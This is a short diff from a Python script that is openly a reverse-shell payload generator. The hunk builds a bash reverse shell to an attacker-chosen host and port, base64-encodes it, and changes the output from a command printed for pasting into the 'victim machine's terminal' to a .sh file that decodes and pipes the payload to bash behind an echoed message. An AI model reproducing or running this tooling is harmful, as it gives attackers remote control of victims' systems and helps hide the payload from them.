@@ -76,8 +76,10 @@ if payload=="a" or payload=="A":
 	rshell=f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
 	encodedrshell=base64.b64encode(rshell.encode("utf-8"))
 	encodedrshells=encodedrshell.decode("utf-8")
-	print("GENERATING PAYLOAD >>> copy and paste the below script in the victim machine's terminal after starting listaner")
-	print(f"echo -e '\033[1;38m {additional}' && base64 -d <<< {encodedrshells} | sh")
+	print(f"GENERATING PAYLOAD >>> {output}/{name}.sh")
+	f=open(f"{output}/{name}.sh","w+")
+	f.write(f"echo -e '\033[1;38m {additional}' && base64 -d <<< {encodedrshells} | bash")
+	f.close()
 elif payload=="1":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
